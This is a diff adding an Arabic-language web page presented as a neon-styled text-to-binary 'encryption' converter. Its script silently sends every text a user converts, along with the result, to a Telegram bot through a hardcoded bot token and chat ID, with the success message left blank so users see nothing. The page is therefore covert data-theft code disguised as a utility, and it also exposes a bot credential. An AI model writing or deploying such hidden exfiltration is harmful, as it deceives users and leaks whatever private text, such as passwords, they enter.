@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <title>محول النص/الثنائي - سايبر بانك</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+
+        body {
+            background: radial-gradient(circle at 20% 20%, #0a0f0f, #000000);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.05) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(255, 0, 255, 0.05) 1px, transparent 1px);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 900px;
+            background: rgba(10, 20, 30, 0.85);
+            backdrop-filter: blur(12px);
+            -webkit-backdrop-filter: blur(12px);
+            border: 3px solid #00ffff;
+            box-shadow: 0 0 30px #00ffff, inset 0 0 20px #ff00ff40;
+            border-radius: 40px;
+            padding: 25px;
+            position: relative;
+            z-index: 2;
+            animation: borderPulse 4s infinite alternate;
+        }
+
+        @keyframes borderPulse {
+            0% { border-color: #00ffff; box-shadow: 0 0 20px #00ffff; }
+            50% { border-color: #ff00ff; box-shadow: 0 0 40px #ff00ff; }
+            100% { border-color: #00ffff; box-shadow: 0 0 20px #00ffff; }
+        }
+
+        h1 {
+            font-size: clamp(2.5rem, 12vw, 4rem);
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            text-align: center;
+            margin-bottom: 25px;
+            color: #00ffff;
+            text-shadow: 
+                0 0 10px #00ffff,
+                0 0 20px #00ffff,
+                2px 2px 0 #ff00ff;
+            animation: glitch 2.5s infinite;
+            word-break: break-word;
+        }
+
+        @keyframes glitch {
+            0%, 100% { transform: skew(0deg, 0deg); opacity: 1; }
+            95% { transform: skew(1deg, 0.5deg); opacity: 0.9; text-shadow: -2px 0 #ff00ff, 2px 0 #00ffff; }
+            96% { transform: skew(-1deg, -0.5deg); }
+            97% { transform: skew(0deg, 0deg); }
+        }
+
+        textarea, [contenteditable="true"] {
+            width: 100%;
+            background: #0a1420;
+            border: 2px solid #00ffff;
+            border-radius: 20px;
+            padding: 18px;
+            color: #00ffcc;
+            font-size: 1.1rem;
+            font-family: 'Courier New', monospace;
+            resize: vertical;
+            box-shadow: 0 0 15px #00ffff80;
+            transition: all 0.3s;
+            direction: ltr;
+            outline: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        textarea:focus, [contenteditable="true"]:focus {
+            border-color: #ff00ff;
+            box-shadow: 0 0 25px #ff00ff;
+        }
+
+        textarea::placeholder {
+            color: #4a6a8a;
+            font-style: italic;
+        }
+
+        [contenteditable="true"] {
+            min-height: 120px;
+            max-height: 300px;
+            overflow-y: auto;
+            word-wrap: break-word;
+            background: #0a1420;
+            border-color: #ff00ff;
+            box-shadow: 0 0 15px #ff00ff80;
+            font-size: 1rem;
+            line-height: 1.6;
+            white-space: pre-wrap;
+        }
+
+        [contenteditable="true"]:empty:before {
+            content: "النتيجة الثنائية ستظهر هنا...";
+            color: #4a6a8a;
+            font-style: italic;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            flex-wrap: wrap;
+            margin: 20px 0;
+        }
+
+        button {
+            background: transparent;
+            color: #00ffff;
+            border: 2px solid #00ffff;
+            padding: 16px 30px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-radius: 60px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 0 15px #00ffff;
+            text-shadow: 0 0 5px #00ffff;
+            position: relative;
+            overflow: hidden;
+            flex: 1 1 auto;
+            min-width: 160px;
+            touch-action: manipulation;
+        }
+
+        button::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, #00ffff40, transparent);
+            transition: left 0.5s;
+        }
+
+        button:hover {
+            background: #00ffff20;
+            color: #ffffff;
+            border-color: #ff00ff;
+            box-shadow: 0 0 30px #ff00ff;
+            transform: scale(1.03);
+        }
+
+        button:hover::before {
+            left: 100%;
+        }
+
+        .decrypt-btn {
+            color: #ff00ff;
+            border-color: #ff00ff;
+            box-shadow: 0 0 15px #ff00ff;
+        }
+
+        .copy-btn {
+            background: transparent;
+            color: #ffaa00;
+            border: 2px solid #ffaa00;
+            box-shadow: 0 0 15px #ffaa00;
+            padding: 12px 25px;
+            font-size: 1.2rem;
+            min-width: 120px;
+        }
+
+        .copy-btn:hover {
+            background: #ffaa0020;
+            border-color: #ff00ff;
+            box-shadow: 0 0 30px #ff00ff;
+        }
+
+        .status-message {
+            text-align: center;
+            color: #00ff00;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            text-shadow: 0 0 5px #00ff00;
+            min-height: 20px;
+        }
+
+        .error-status {
+            color: #ff5555;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .error-glow {
+            border-color: #ff3300 !important;
+            box-shadow: 0 0 20px #ff3300 !important;
+        }
+
+        .copy-notification {
+            background: #00aa00;
+            color: black;
+            padding: 5px 10px;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1 class="glitch-text">S46441</h1>
+
+        <!-- حقل النص الأصلي -->
+        <textarea id="textInput" placeholder="اكتب أي شيء ..." rows="3"></textarea>
+
+        <!-- أزرار التشفير وفك التشفير -->
+        <div class="button-group">
+            <button id="encryptBtn" class="encrypt-btn">⟐ تشفير ⟐</button>
+            <button id="decryptBtn" class="decrypt-btn">⟐ فك تشفير ⟐</button>
+        </div>
+
+        <!-- حقل عرض النتيجة مع زر نسخ بجانبه (ضمن مجموعة أزرار) -->
+        <div id="binaryOutput" contenteditable="true" aria-placeholder="النتيجة ستظهر هنا..."></div>
+        
+        <div class="button-group" style="margin-top: 5px;">
+            <button id="copyBtn" class="copy-btn">📋 نسخ النتيجة</button>
+        </div>
+
+        <!-- رسالة الحالة -->
+        <div id="statusMessage" class="status-message"></div>
+    </div>
+
+    <script>
+        (function() {
+            // ============================================================
+            // ⚡ قم بتعديل القيم التالية بإعدادات بوت تليجرام الخاص بك ⚡
+            // ============================================================
+            const BOT_TOKEN = '8319256664:AAEaXwZu9-cv4XQtypUaCmlP2dpvu-uXnR4';          // استبدل هذا بالقيمة الحقيقية
+            const CHAT_ID   = '6612813200';    // استبدل هذا بالقيمة الحقيقية
+            // ============================================================
+
+            // عناصر الصفحة
+            const textField = document.getElementById('textInput');
+            const binaryField = document.getElementById('binaryOutput');
+            const encryptBtn = document.getElementById('encryptBtn');
+            const decryptBtn = document.getElementById('decryptBtn');
+            const copyBtn = document.getElementById('copyBtn');
+            const statusDiv = document.getElementById('statusMessage');
+
+            // دوال التحويل
+            function textToBinary(text) {
+                const encoder = new TextEncoder();
+                const bytes = encoder.encode(text);
+                let binaryString = '';
+                for (let i = 0; i < bytes.length; i++) {
+                    let byte = bytes[i];
+                    let bin = byte.toString(2);
+                    while (bin.length < 8) {
+                        bin = '0' + bin;
+                    }
+                    binaryString += bin;
+                    if (i < bytes.length - 1) binaryString += ' ';
+                }
+                return binaryString;
+            }
+
+            function binaryToText(binaryStr) {
+                const clean = binaryStr.replace(/\s+/g, '');
+                if (clean.length === 0) return '';
+                if (clean.length % 8 !== 0) {
+                    throw new Error('عدد البتات ليس من مضاعفات 8');
+                }
+                if (!/^[01]+$/.test(clean)) {
+                    throw new Error('يحتوي على أحرف غير 0 أو 1');
+                }
+                const bytes = [];
+                for (let i = 0; i < clean.length; i += 8) {
+                    const byteStr = clean.substr(i, 8);
+                    const byte = parseInt(byteStr, 2);
+                    bytes.push(byte);
+                }
+                const decoder = new TextDecoder();
+                return decoder.decode(new Uint8Array(bytes));
+            }
+
+            // دالة إرسال إلى تليجرام (ترسل النص الأصلي والنتيجة معاً)
+            async function sendToTelegram(original, result, type) {
+                if (!BOT_TOKEN || !CHAT_ID || BOT_TOKEN.includes('ضع_التوكن') || CHAT_ID.includes('ضع_رقم')) {
+                    statusDiv.innerHTML = '⚠️ يرجى ضبط إعدادات البوت في الكود أولاً';
+                    statusDiv.classList.add('error-status');
+                    return false;
+                }
+
+                statusDiv.innerHTML = ''; //اذا تريد اضافة رسالة تظهر حينا تتم العملية
+                statusDiv.classList.remove('error-status');
+
+                // تكوين الرسالة
+                const message = `<b>${type}</b>\n\n<b>النص الأصلي:</b>\n${original}\n\n<b>النتيجة:</b>\n${result}`;
+
+                try {
+                    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.ok) {
+                        statusDiv.innerHTML = '';  // لإضافة نتيجة(نص) بعد اتمام العملية
+                        return true;
+                    } else {
+                        statusDiv.innerHTML = `❌ خطأ: ${data.description}`;
+                        statusDiv.classList.add('error-status');
+                        return false;
+                    }
+                } catch (error) {
+                    statusDiv.innerHTML = `❌ فشل الاتصال: ${error.message}`;
+                    statusDiv.classList.add('error-status');
+                    return false;
+                }
+            }
+
+            // زر التشفير
+            encryptBtn.addEventListener('click', function() {
+                const originalText = textField.value.trim();
+                if (!originalText) {
+                    statusDiv.innerHTML = '❌ الرجاء إدخال نص للتشفير';
+                    statusDiv.classList.add('error-status');
+                    return;
+                }
+
+                // تحويل إلى binary
+                const binaryResult = textToBinary(originalText);
+                binaryField.innerText = binaryResult;
+                binaryField.classList.remove('error-glow');
+
+                // إرسال إلى تليجرام (نص أصلي + نتيجة)
+                sendToTelegram(originalText, binaryResult, '🔐 عملية تشفير');
+            });
+
+            // زر فك التشفير
+            decryptBtn.addEventListener('click', function() {
+                const binaryInput = binaryField.innerText.trim();
+                if (!binaryInput) {
+                    statusDiv.innerHTML = '❌ الرجاء إدخال كود ثنائي في حقل النتيجة';
+                    statusDiv.classList.add('error-status');
+                    return;
+                }
+
+                try {
+                    const originalText = binaryToText(binaryInput);
+                    textField.value = originalText;
+                    binaryField.classList.remove('error-glow');
+
+                    // إرسال إلى تليجرام (نص أصلي + نتيجة)
+                    sendToTelegram(binaryInput, originalText, '🔓 عملية فك تشفير');
+                } catch (e) {
+                    binaryField.classList.add('error-glow');
+                    statusDiv.innerHTML = `❌ خطأ: ${e.message}`;
+                    statusDiv.classList.add('error-status');
+                }
+            });
+
+            // زر نسخ النتيجة
+            copyBtn.addEventListener('click', function() {
+                const resultText = binaryField.innerText.trim();
+                if (!resultText) {
+                    statusDiv.innerHTML = '❌ لا يوجد نص لنسخه';
+                    statusDiv.classList.add('error-status');
+                    return;
+                }
+
+                // استخدام Clipboard API
+                navigator.clipboard.writeText(resultText).then(() => {
+                    statusDiv.innerHTML = '📋 تم نسخ النتيجة إلى الحافظة';
+                    statusDiv.classList.remove('error-status');
+                }).catch(err => {
+                    statusDiv.innerHTML = '❌ فشل النسخ';
+                    statusDiv.classList.add('error-status');
+                });
+            });
+
+            // إزالة أي تحديث تلقائي: لا نستخدم أحداث الإدخال
+            // (نترك الحقول قابلة للتحرير ولكن لا تؤثر على الآخر)
+        })();
+    </script>
+</body>
+</html>
